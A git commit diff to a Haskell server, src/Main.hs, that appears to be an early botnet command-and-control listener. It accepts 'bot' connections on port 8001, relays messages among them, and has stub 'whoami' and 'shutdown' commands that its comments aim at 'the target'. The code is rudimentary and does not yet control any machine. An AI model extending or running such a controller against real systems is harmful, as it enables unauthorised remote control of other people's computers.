5f3593e3afaa7991c4759007fef3c705e921ead7
0xvpr <malikrb@live.com>
2021-11-29 04:14:14 -0600

    changed infrastructure

--- src/Main.hs
+++ src/Main.hs
@@ -1,25 +1,67 @@
-module Main where 
-    import Network.Socket
-    import Network.Socket
-    import Network.Socket.ByteString
-    import qualified Data.ByteString.Char8 as C
+module Main where
 
-    main::IO()
-    main = do
-        sock<-socket AF_INET Stream 0
-        bind sock (SockAddrInet 8001 0)
-        listen sock 2
-        mainloop sock
+import System.IO
+import Network.Socket
+import Control.Exception
+import Control.Concurrent
+import Control.Monad (when)
+import Control.Monad.Fix (fix)
 
+main :: IO ()
+main = do
+    sock <- socket AF_INET Stream 0
+    setSocketOption sock ReuseAddr 1
+    bind sock (SockAddrInet 8001 0)
+    listen sock 2
 
-    mainloop::Socket->IO()
-    mainloop sock = do
-        conn<-accept sock
-        runConn conn
-        mainloop sock
+    -- Initial Message (un-hardcode this)
+    putStrLn ("[!] Listening on port: localhost:8001")
 
+    chan <- newChan
+    _ <- forkIO $ fix $ \loop -> do
+      (_, _) <- readChan chan
+      loop
+    mainLoop sock chan 0
 
-    runConn::(Socket,SockAddr)->IO()
-    runConn (sock,_)=do
-        Network.Socket.ByteString.send sock (C.pack "hello")
-        close sock
+type Msg = (Int, String)
+
+mainLoop :: Socket -> Chan Msg -> Int -> IO ()
+mainLoop sock chan msgNum = do
+    conn <- accept sock
+    forkIO (runConn conn chan msgNum)
+    mainLoop sock chan $! msgNum + 1
+
+runConn :: (Socket, SockAddr) -> Chan Msg -> Int -> IO ()
+runConn (sock, _) chan msgNum = do
+    let broadcast msg = writeChan chan (msgNum, msg)
+    hdl <- socketToHandle sock ReadWriteMode
+    hSetBuffering hdl NoBuffering
+
+    -- Debug
+    putStrLn ("[+] Bot connected.")
+    putStr (":> ")
+    recvBuffer <- fmap init (hGetLine hdl)
+    putStrLn ("Data: " ++ recvBuffer ++ " recieved.")
+    putStr (":> ")
+
+    commLine <- dupChan chan
+
+    -- fork off a thread for reading from the duplicated channel
+    reader <- forkIO $ fix $ \loop -> do
+        (nextNum, line) <- readChan commLine
+        when (msgNum /= nextNum) $ hPutStrLn hdl line
+        loop
+
+    handle (\(SomeException _) -> return ()) $ fix $ \loop -> do
+        line <- fmap init (hGetLine hdl)
+        case line of
+             -- Issue a command to get the username of the target
+             "whoami" -> putStrLn "whoami" >> loop
+             -- Issue a command to terminate the bot
+             "shutdown" -> putStrLn "shutdown"
+             -- else, continue looping.
+             _      -> broadcast (recvBuffer ++ ": " ++ line) >> loop
+
+    killThread reader                      -- kill after the loop ends
+    broadcast ("[-] " ++ recvBuffer ++ " executed?") -- make a final broadcast
+    hClose hdl                             -- close the handle
